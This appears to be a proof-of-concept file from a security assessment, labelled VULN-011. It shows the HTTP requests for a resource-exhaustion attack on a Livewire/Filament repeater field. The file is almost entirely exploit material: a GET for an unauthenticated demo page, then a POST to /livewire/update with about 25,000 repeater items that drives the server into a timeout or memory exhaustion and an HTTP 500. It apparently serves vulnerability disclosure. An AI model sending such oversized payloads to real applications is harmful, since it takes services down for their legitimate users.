### VULN-011 — decisive request. Full capture in response.txt / run.log.
### data.repeater is public (non-#[Locked]) Livewire state. A Repeater hydrates one
### full child schema per item; maxItems() is opt-in and unset by default → no ceiling.

### 1) Snapshot (unauthenticated demo page)
GET /forms/fields/repeater HTTP/1.1
Host: localhost:21890

### 2) Submit ~25,000 repeater items in one request → ~30s server work → HTTP 500
POST /livewire/update HTTP/1.1
Host: localhost:21890
Content-Type: application/json
X-Livewire: true

{"_token":"<csrf>","components":[{"snapshot":"<forms.fields-demo snapshot>","calls":[],
  "updates":{"data.repeater":[{"name":"n0","role":"developer"}, /* ...×25000... */ ]}}]}

### Response: HTTP 500; app log: "Maximum execution time of 30 seconds exceeded"
### (or "Allowed memory size ... exhausted" at higher item counts).
